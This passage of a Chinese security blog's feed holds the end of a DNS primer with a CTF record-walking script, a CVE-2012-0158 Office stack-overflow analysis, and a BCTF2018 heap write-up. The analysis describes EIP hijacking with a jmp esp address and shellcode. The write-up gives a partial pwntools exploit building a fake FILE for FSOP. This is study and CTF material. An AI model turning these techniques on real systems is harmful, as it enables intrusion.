rel="noopener">www.google.com</a></strong>的<strong>记录</strong>，但无法找到它的地址，<strong>根服务器</strong>会将这个域名的<strong>com</strong>部分匹配，并将这个信息传递回来源处。</p></blockquote><h3 id="TLD服务器"><a href="#TLD服务器" class="headerlink" title="TLD服务器"></a><strong>TLD服务器</strong></h3><p>接着上一步，一旦对<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>的请求得到回复，<strong>根服务器</strong>就会代替<strong>域名服务器</strong>接受来自发送请求的计算机的询问：<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>的地址在哪里。<strong>TLD服务器</strong>将尝试在其<strong>记录</strong>中找到<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>的信息，但只能回复关于<strong>google.com</strong>的详细信息。在这一阶段，计算机会知道这个服务器以<strong>com</strong>解析，且至少能够将地址映射到某一个<strong>IP地址</strong>。</p><h3 id="域级域名服务器-Domain-level-Nameservers"><a href="#域级域名服务器-Domain-level-Nameservers" class="headerlink" title="域级域名服务器(Domain-level Nameservers)"></a><strong>域级域名服务器</strong>(Domain-level Nameservers)</h3><p>到了这个阶段，对<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>的请求已经被回复了两次：第一次由<strong>根服务器</strong>不处理任何<strong>记录</strong>但知道是需要归于<strong>com</strong>处理；再一次由<strong>TLD服务器</strong>处理<strong>com</strong>并且知道<strong>google</strong>在哪里。即使如此，我们仍还有一个<strong>www</strong>未处理，为此，该请求将传给<strong>google.com</strong>的服务器进行解析。<strong>google</strong>的服务器将在其<strong>记录</strong>中正确查找到<strong><a href="http://www.google.com" target="_blank" rel="noopener">www.google.com</a></strong>，并使用其对应的<strong>IP地址</strong>进行响应。</p><blockquote><p>至此，我们完成了一个完整的访问请求，看似步骤复杂，实际上DNS查询在短短几秒之内就会完成。</p></blockquote><hr><h2 id="0x05主机特定的DNS配置-Host-specific-DNS-Configuration"><a href="#0x05主机特定的DNS配置-Host-specific-DNS-Configuration" class="headerlink" title="0x05主机特定的DNS配置(Host-specific DNS Configuration)"></a>0x05主机特定的DNS配置(Host-specific DNS Configuration)</h2><blockquote><p>也就是我们常说的hosts文件，我一直以来有个疑问为什么装破解版软件时需要改hosts文件，为什么改了hosts文件之后就能够访问谷歌网站，hosts文件到底是何方神圣？这一节将从Unix系统的方面说一说<strong>主机特定的DNS配置</strong>，Linux系统和Windows系统类似。</p></blockquote><h3 id="etc-hosts"><a href="#etc-hosts" class="headerlink" title="/etc/hosts"></a>/etc/hosts</h3><p><strong>/etc/hosts</strong>具有充当本地替代DNS的作用，若用户想要在特定的计算机上覆盖DNS中的<strong>记录</strong>而又不想影响其他用户使用该<strong>记录</strong>，则可使用<strong>/etc/hosts</strong>来覆盖DNS，或者将其作为DNS的备份：若在<strong>/etc/hosts</strong>中的基础结构中指定了关键型的hosts，则即使在持有用户域名的<strong>域名服务器</strong>中缺少<strong>Zonefile</strong>时也能够正常解析。<br>但是<strong>/etc/hosts</strong>远远不能DNS的替代品：DNS具有更加丰富的<strong>记录类型</strong>，而<strong>/etc/hosts</strong>只能相当于众多<strong>记录</strong>中的<strong>A记录</strong>。<br><strong>/etc/hosts</strong>大概是长这个样纸滴：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 localhost </span><br><span class="line">255.255.255.255 broadcasthost </span><br><span class="line">:: 1 localhost </span><br><span class="line">fe80 :: 1％ lo0 localhost</span><br><span class="line"></span><br><span class="line">192.168.2.2 sql01 </span><br><span class="line">192.168.2.3 sql02 </span><br><span class="line">192.168.1.10 fish bubble o0O</span><br></pre></td></tr></table></figure><p>该文件的前四行是系统自带的，并在启动时生效。前两行分别将<strong>localhost</strong>、<strong>127.0.0.1</strong>之间和<strong>broadcasthost</strong>、<strong>255.255.255.255</strong>之间建立映射，后面两行其实是在IPv6下第一行的等价物。在第四行之后，我们可以指定一个名称并将其映射到一个IP地址。如第五行，我们将<strong>sql01</strong>映射到<strong>192.168.2.2</strong>，这意味着在具有这个<strong>/etc/hosts</strong>的主机上我们可以访问<strong>sql01</strong>并以<strong>192.168.2.2</strong>作为响应，第六行同理。而第七行却是一个奇怪的例子，一个IP地址对应了3个域名，当以这种方式引用时(对于每个IP地址使用多个以空格分隔的名称)，则可以使用任意指定的域名访问该IP地址，即使用<strong>fish</strong>，<strong>bubble</strong>和<strong>o0O</strong>都是访问<strong>192.168.1.10</strong>的有效方式。</p><hr><h2 id="0x06-缓存-Caching"><a href="#0x06-缓存-Caching" class="headerlink" title="0x06 缓存(Caching)"></a>0x06 缓存(Caching)</h2><p>为降低硬件成本、减轻网络压力，并加快对常见域名的响应速度，很多客户机都会<strong>缓存</strong>DNS<strong>记录</strong>。在<strong>Zonefile</strong>的<strong>SOA记录</strong>中会指定一个<strong>expiry</strong>，该值将决定<strong>Zonefile</strong>维持改状态的时间，在此段时间内再起发起相同的请求就回直接利用<strong>缓存</strong>解析而不用再向<strong>根服务器</strong>发起解析请求。</p><hr><h2 id="0x07-生存时间-TTLs"><a href="#0x07-生存时间-TTLs" class="headerlink" title="0x07 生存时间(TTLs)"></a>0x07 生存时间(TTLs)</h2><p>既然提到了<strong>缓存</strong>那就不得不提<strong>TTL</strong>，TTL能使个别<strong>记录</strong>强制到期，从而绕过<strong>SOA记录</strong>中的<strong>expiry</strong>。如<strong>o0O.com</strong>已经转移到了一个新的网络主机，为确保服务正常运行，可通过减少<strong>www</strong>和*在<strong>o0O.com</strong>的<strong>Zonefile</strong>中的<strong>TTL</strong>来实现切换。具有合适的高<strong>TTL</strong>和适当的<strong>缓存</strong>，计算机响应请求的时间以及<strong>缓存</strong>更新<strong>记录</strong>的时间都将大大缩短。</p><blockquote><p>解析<strong>域名</strong>时会最先检查本地的<strong>hosts文件</strong>中是否存在该<strong>域名</strong>的映射关系，若有则直接调用该<strong>IP地址</strong>映射，完成解析。若无，则查找本地DNS解析器<strong>缓存</strong>中有无该<strong>域名</strong>的映射关系，若有也直接返回完成解析，若无再遵循上文中所说的进入正常的<strong>域名</strong>解析流程。</p></blockquote><hr><h2 id="0x08-这次比赛的DNS101"><a href="#0x08-这次比赛的DNS101" class="headerlink" title="0x08 这次比赛的DNS101"></a>0x08 这次比赛的DNS101</h2><blockquote><p>查询DNS的工具有很多，在这里就说一下比赛做题的时候遇到的<strong>dig</strong>工具吧。</p></blockquote><p><strong>dig</strong>是Unix平台自带的可以用来查看特定域名服务器<strong>记录</strong>工具，我用到的基本用法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dig + 域名 + 记录类型&#x2F;&#x2F;若不指定记录类型则默认为A记录</span><br></pre></td></tr></table></figure><ul><li>比赛中直接挖<strong>TXT记录</strong>就会发现有一条<strong>flag-id-[…].flag.src.edu-info.edu.cn</strong>的<strong>记录</strong>。</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/8447551-6f291dee44ae150f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="以TXT类型进行dig"></p><ul><li>而如果以<strong>ANY</strong>的类型来挖，则会尝试所有类型的记录，可以发现在存在一条<strong>NSEC</strong>记录解析到<em>n.flag.src.edu-info.edu.cn</em>并且这个域名存在<strong>TXT记录</strong>、<strong>RRSIG记录</strong>和<strong>NSEC记录</strong>。</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/8447551-c0efb1ed9a23c5e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="以ANY类型进行dig"></p><ul><li>继续向下挖掘，发现<strong>NSEC记录</strong>中又出现了新的域名，并且也存在<strong>TXT记录</strong>、<strong>RRSIG记录</strong>和<strong>NSEC记录</strong>。</li></ul><p><img src="http://upload-images.jianshu.io/upload_images/8447551-123c57582fa3a728.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="对得到的新域名进行dig"></p><blockquote><p>现在学了DNS以上相关知识后，可以判断这道题的DNS服务器那边的是在<strong>Zonefile</strong>中以<strong>NSEC记录</strong>的方式形成了一个链表将这些域名链接起来，*.flag.src.edu-info.edu.cn型的域名都有个<strong>TXT记录</strong>提示最终的域名为<strong>flag-id-[…].flag.src.edu-info.edu.cn</strong>这个形式的。当时手动<strong>dig</strong>完全不知道原理，就知道输完了之后会得到一个新域名又继续<strong>dig</strong>，感觉灰常神奇，为什么有这么多挖不完的域名。也理解了那些大网站如何实现域名第一个<strong>.</strong>前面有那么多种名称。然后最后吐槽一句，python库是真的神奇，当初啥都不知道的时候只有靠切片来维持生活，<strong>dig</strong>到一半输出格式不同了还切不动，然后参考浙大表哥们WriteUp中的脚本后。。。<del>一万只草泥马奔腾而过</del></p></blockquote><ul><li>附上我的脚本以及结果：</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">rerr = re.compile(<span class="string">'NSEC.+flag.src.edu-info.edu.cn'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">execCmd</span><span class="params">(cmd)</span>:</span>  </span><br><span class="line">    r = os.popen(cmd)  </span><br><span class="line">    text = r.read()  </span><br><span class="line">    r.close()  </span><br><span class="line">    <span class="keyword">return</span> text</span><br><span class="line">    </span><br><span class="line">payload = <span class="string">'dig any what.is.my.flag.src.edu-info.edu.cn'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10000</span>):</span><br><span class="line">a = execCmd(payload)</span><br><span class="line">rerrrrr = rerr.search(a)</span><br><span class="line">payload=rerrrrr.group(<span class="number">0</span>).replace(<span class="string">'NSEC'</span>,<span class="string">''</span>).lstrip()</span><br><span class="line"><span class="keyword">print</span> payload</span><br><span class="line">payload=<span class="string">'dig any '</span>+payload</span><br></pre></td></tr></table></figure><p><img src="http://upload-images.jianshu.io/upload_images/8447551-dffae34ddfc59dea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="失败"></p><ul><li>附上浙大大表哥们的脚本及结果：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import dns.resolver</span><br><span class="line">url&#x3D;&quot;what.is.my.flag.src.edu-info.edu.cn&quot;</span><br><span class="line">while True:</span><br><span class="line">emm &#x3D; dns.resolver.query(url,&quot;NSEC&quot;)</span><br><span class="line">url&#x3D;list(emm)[0].next.to_text()</span><br><span class="line">print(url)</span><br></pre></td></tr></table></figure><img src="http://upload-images.jianshu.io/upload_images/8447551-da06068fc4403d40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="成功"></li><li>然后再将得到的<strong>flag-id-ztfrneclyudrfq3e6endq5.zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz.zzzzzzz.flag.src.edu-info.edu.cn</strong>拿去dig得到了flag<br><img src="http://upload-images.jianshu.io/upload_images/8447551-4c2e9e03a57b64b9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="flag"></li></ul><hr><h2 id="0x09-参考资料"><a href="#0x09-参考资料" class="headerlink" title="0x09 参考资料"></a>0x09 参考资料</h2><p><a href="http://www.opsschool.org/en/latest/dns_101.html#domain-level-nameservers" target="_blank" rel="noopener">DNS 101</a><br><a href="http://blog.csdn.net/eroswang/article/details/6576190" target="_blank" rel="noopener">常用域名记录解释</a><br><a href="http://blog.sina.com.cn/s/blog_502c8cc40100zxpv.html" target="_blank" rel="noopener">DNS原理及其解析过程</a><br><a href="http://blog.sina.com.cn/s/blog_502c8cc40100zxpv.html" target="_blank" rel="noopener">域名配置Zone文件</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2012-0158 Microsoft Office 栈溢出漏洞分析</title>
      <link href="/2020/03/12/CVE-2012-0158%20Microsoft%20Office%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
      <url>/2020/03/12/CVE-2012-0158%20Microsoft%20Office%20%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p><strong>Office</strong>很经典的一个栈溢出漏洞</p><a id="more"></a><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p><img src="https://upload-images.jianshu.io/upload_images/8447551-1760feff37d474a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Microsoft Office 2003"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-8f2172ee968a1da9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Win Xp SP2"></p><h2 id="动态分析-定位漏洞"><a href="#动态分析-定位漏洞" class="headerlink" title="动态分析-定位漏洞"></a>动态分析-定位漏洞</h2><p>先用<strong>OllyDbg</strong>加载<strong>WinWord</strong>打开<strong>poc</strong>，此时产生了<strong>crash</strong>，可以看到<strong>EIP</strong>被篡改成了<strong>AAAA</strong>，并且通过栈回溯我们可以看到最近的一个返回地址为<strong>275C8A0A</strong>在<strong>MSCOMCTL</strong>中。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-315cc7751b36ce0c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="crash.png"><br>此时我们跟到<strong>275C8A0A</strong>处，发现是在函数<strong>275C89C7</strong>中，查看其上一句调用了<strong>275C876D</strong>函数。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-186d8ddf1b9ba68e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="栈回溯"><br>看栈里面的内容：刚刚看到的<strong>275C8A0A</strong>返回地址在崩溃时跳转地址<strong>AAAA</strong>的低地址方向，说明这个栈已经被收回了。也就是说，已经执行完<strong>275C876D</strong>这个函数，在<strong>275C89C7</strong>函数返回时，执行到<strong>AAAA</strong>，导致程序崩溃。并且在<strong>ret</strong>前调用的最后一个函数是<strong>275C876D</strong>，从执行完<strong>275C876D</strong>函数往下看经过<strong>jl</strong>跳转最后<strong>ret</strong>发现并没有太多的栈操作，所以推断造成溢出是发生在<strong>275C876D</strong>函数中。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4be46e76c5e26045.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="275C89C7函数"><br>我们在<strong>275C8A05</strong>处下断点，重新执行<strong>poc</strong>，触发断点后步进<strong>275C876D</strong>函数。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-82db6e0385ac7b7d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="275C876D函数"><br><strong>F7</strong>步入执行到<strong>275C87CB</strong>处，发现该代码实现将<strong>8D92008</strong>处数据往栈里复制<strong>0x20A0</strong>长度的操作，并且出现了<strong>AAAA</strong>，可以看出复制后刚好可以把栈上<strong>121820</strong>处的返回地址覆盖成<strong>AAAA</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-d7a9abdc7c2bb063.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="漏洞位置"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-1fbff11b2e2d6278.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="覆盖返回地址"><br>之后就是执行完<strong>275C876D</strong>，返回到<strong>275C89C7</strong>函数，执行完再返回时<strong>EIP</strong>指向<strong>41414141</strong>产生程序崩溃。</p><h2 id="静态分析-分析漏洞"><a href="#静态分析-分析漏洞" class="headerlink" title="静态分析-分析漏洞"></a>静态分析-分析漏洞</h2><p>用<strong>IDA</strong>打开<strong>MSCOMCTL.OCX</strong>，直接跳转到我们的漏洞函数<strong>275C89C7</strong>，可以看到触发漏洞的<strong>275C876D</strong>函数其实是叫<strong>CopyOLEdata</strong>。其中传入了在<strong>EBP-8</strong>位置的参数<strong>v7</strong>、字符串<strong>bstrString</strong>，以及一个通过<strong>if</strong>判断后大于等于<strong>8</strong>的<strong>dwBytes</strong>。触发条件为首先从<strong>bstrString</strong>中读取<strong>0xC</strong>字节到临时变量<strong>v5</strong>中，并且判断<strong>v5</strong>的前四字节是否为<strong>Cobj</strong>以及<strong>dwBytes</strong>是否大于等于<strong>8</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-222850a0be83616d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="VulFunc"><br>跟进触发漏洞的函数，可以看到会有一个<strong>qmemcpy</strong>函数(也就是之前在<strong>OllyDbg</strong>里看到的那条<strong>REP MOVS</strong>指令)将刚刚的<strong>bstrString</strong>复制<strong>dwBytes</strong>的长度到刚刚的<strong>EBP - 8</strong>的位置，发生了栈溢出。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-802577093e35c41d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CopyOLEdata"><br>从这条<strong>qmemcpy</strong>赋值语句可以看出，该漏洞应该是个逻辑漏洞。上方判断条件为<strong>dwBytes ≥ 8</strong>，使得只要进入该分支，就会在赋值时长度大于<strong>8</strong>造成栈溢出而导致程序崩溃。按照程序逻辑，该判断条件应该为<strong>dwBytes ≤ 8</strong>。<br>在<strong>patch</strong>后的<strong>MSCOMCTL.OCX</strong>中也是将该分支的判断条件修改为了只有当<strong>dwBytes == 8</strong>时才会进入。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-d19ed6176e063379.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Patched"></p><h2 id="构造EXP-利用漏洞"><a href="#构造EXP-利用漏洞" class="headerlink" title="构造EXP-利用漏洞"></a>构造EXP-利用漏洞</h2><p>通过前期调试可以看到最终崩溃点为<strong>41414141</strong>的地址，因此在<strong>poc.doc</strong>中去查询该字符串，即可定位到<strong>POC</strong>中劫持EIP的地方，如下图所示。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-a3fbe9b2c8eb70a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="EIP覆盖位置"><br>由于没开<strong>DEP保护</strong>，直接将<strong>41414141</strong>改为<strong>1245fa7f（7ffa4512 =&gt; jmp esp）</strong>，并经调试在后面平衡<strong>2</strong>个指针大小的栈后，直接布置<strong>shellcode</strong>，最终达到命令执行。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-4e9f6de3f2c44b99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="构造exp"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-5f10dc835b5e8ce4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="最终效果"></p><ul><li><strong>TODO</strong><br>利用<strong>ROP</strong>构造<strong>EXP</strong></li></ul><h2 id="分析POC-理解流程"><a href="#分析POC-理解流程" class="headerlink" title="分析POC-理解流程"></a>分析POC-理解流程</h2><p>先把利用<strong><a href="https://github.com/decalage2/oletools" target="_blank" rel="noopener">oletools</a></strong>中的<strong>rtfobj</strong>扫描<strong>poc.doc</strong>得到如下结果。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-67fc450c27962183.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="oletool"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vulnerability </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BCTF2018 baby_arena</title>
      <link href="/2020/03/12/BCTF2018%20baby_arena/"/>
      <url>/2020/03/12/BCTF2018%20baby_arena/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞位置"><a href="#漏洞位置" class="headerlink" title="漏洞位置"></a>漏洞位置</h2><p>在<strong>login</strong>函数中<strong>v3</strong>变量大小只有<strong>8</strong>，输入了<strong>0x10</strong>造成了溢出，溢出到<strong>v4</strong>造成了任意地址写，不过只能写成<strong>admin</strong>或者<strong>clientele</strong>。</p><a id="more"></a><p><img src="https://upload-images.jianshu.io/upload_images/8447551-e9f897733a5593dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="login"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>首先有个<strong>alloc_check</strong>函数限制了申请的堆大小在<strong>0x96</strong>和<strong>0x176F</strong>之间，也就是在<strong>fastbin</strong>之外。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-a64912ab01ee59d9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="alloc_check">在<strong>delete</strong>函数中，<strong>free</strong>后的空间没有清空。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-c5c7b0af7fadeb22.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="delete">由此结合后面的<strong>view</strong>函数可<strong>leak</strong>出<strong>libc</strong>基址，并且获得<strong>global_max_fast</strong>的地址。然后触发<strong>login</strong>中的任意地址写，将<strong>clientele</strong>写到<strong>global_max_fast</strong>的地址，可以将<strong>fastbin</strong>的最大值改成特别大，最后算好偏移，将一个很大的构造好可以触发<strong>FSOP</strong>的<strong>fake_file free</strong>到<strong>IO_list_all</strong>的地方，最后在<strong>exit</strong>时触发<strong>FSOP</strong>执行<strong>one_gadget</strong>起<strong>shell</strong>。</p><blockquote><ul><li><strong>global_max_fast</strong>是<strong>main_arena</strong>中控制最大<strong>fastbin</strong>大小的变量。</li><li><strong>fastbin</strong>在根据大小不同，分别链到<strong>main_arena</strong>中的<strong>fastbinY</strong>数组中，数组大小为<strong>10</strong>，若修改<strong>global_max_fast</strong>之后，更大的<strong>fastbin</strong>将会根据偏移来计算链到的位置，而超出原本<strong>fastbinY</strong>规定的位置，到达<strong>bins</strong>甚至更后面的<strong>File</strong>结构体。</li><li><strong><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/fsop/" target="_blank" rel="noopener">FSOP</a></strong>贴个链接吧，大概就是当程序在干下列事情之一时：</li></ul><p><strong>1.</strong>当<strong>libc</strong>执行<strong>abort</strong>流程时<br><strong>2.</strong>当执行<strong>exit</strong>函数时<br><strong>3.</strong>当执行流从<strong>main</strong>函数返回时<br>会调用<strong>_IO_flush_all_lockp</strong>函数，在调用次函数时，当满足以下条件时：<br><strong>1._IO_FILE -&gt; _mode &lt;= 0</strong><br><strong>2._IO_FILE -&gt; _IO_write_ptr &gt; _IO_FILE -&gt; _IO_write_base</strong><br>又会执行<strong>_IO_OVERFLOW(_IO_FILE_plus , EOF)</strong>函数，其中提到的我们劫持<strong>_IO_list_all</strong>的指针后(<strong>_IO_list_all</strong>中存放了<strong>_IO_FILE</strong>的值)，下面的<strong>_mode</strong>、<strong>_IO_write_ptr</strong>、<strong>_IO_write_base</strong>皆是该结构体上的变量，其中<strong>_IO_OVERFLOW</strong>函数，是存在于<strong>_IO_FILE_plus.vtable</strong>上偏移为<strong>0x18</strong>的函数指针，<strong>_IO_FILE_plus.vtable</strong>也是在该结构提上的指针。以上变量自己按着偏移去构造就行了。值得注意的是，当通过<strong>chunk</strong>劫持了<strong>_IO_list_all</strong>的指针后，由于指针指的是堆快的首地址，所以算偏移时需要减去堆头的大小。</p></blockquote><h2 id="my-exp-py"><a href="#my-exp-py" class="headerlink" title="my-exp.py"></a>my-exp.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">one_gadget = [<span class="number">0x45216</span> , <span class="number">0x4526a</span> , <span class="number">0xf02a4</span> , <span class="number">0xf1147</span>]</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./baby_arena'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'time is up;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size , note)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size\n'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'note\n'</span>)</span><br><span class="line">    p.sendline(note)</span><br><span class="line">    p.recvuntil(<span class="string">'is\n'</span>)</span><br><span class="line">    note_is = p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line">    p.recvuntil(<span class="string">'successed\n'</span>)</span><br><span class="line">    <span class="keyword">return</span> note_is</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(id)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'id:\n'</span>)</span><br><span class="line">    p.sendline(str(id))</span><br><span class="line">    p.recvuntil(<span class="string">'order!\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(name , is_admin)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'exit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'name\n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    p.recvuntil(<span class="string">'admin\n'</span>)</span><br><span class="line">    p.sendline(str(is_admin))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line"><span class="comment">#make fake_file to trigger FSOP</span></span><br><span class="line">fake_file = <span class="string">'a'</span> * (<span class="number">0x20</span> - <span class="number">0x10</span>)     <span class="comment">#padding</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)                 <span class="comment">#write_base =&gt; offset_0x20</span></span><br><span class="line">fake_file += p64(<span class="number">1</span>)                 <span class="comment">#write_ptr  =&gt; offset_0x28</span></span><br><span class="line">fake_file += <span class="string">'b'</span> * (<span class="number">0xb8</span> - <span class="number">0x28</span>)    <span class="comment">#padding</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)                 <span class="comment">#mode       =&gt; offset_0xc0</span></span><br><span class="line">fake_file += <span class="string">'c'</span> * (<span class="number">0xd0</span> - <span class="number">0xc0</span>)    <span class="comment">#padding</span></span><br><span class="line">fake_file += p64(<span class="number">0x6020b0</span> - <span class="number">0x18</span>)   <span class="comment">#vtable     =&gt; offset_0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#leak libc_base and get some important addr</span></span><br><span class="line">create(<span class="number">0xa0</span> , <span class="string">'1'</span> * <span class="number">0xa0</span>)           <span class="comment">#0</span></span><br><span class="line">create(<span class="number">0xa0</span> , <span class="string">'2'</span> * <span class="number">0xa0</span>)           <span class="comment">#1</span></span><br><span class="line">create(<span class="number">0x1400</span> , fake_file)          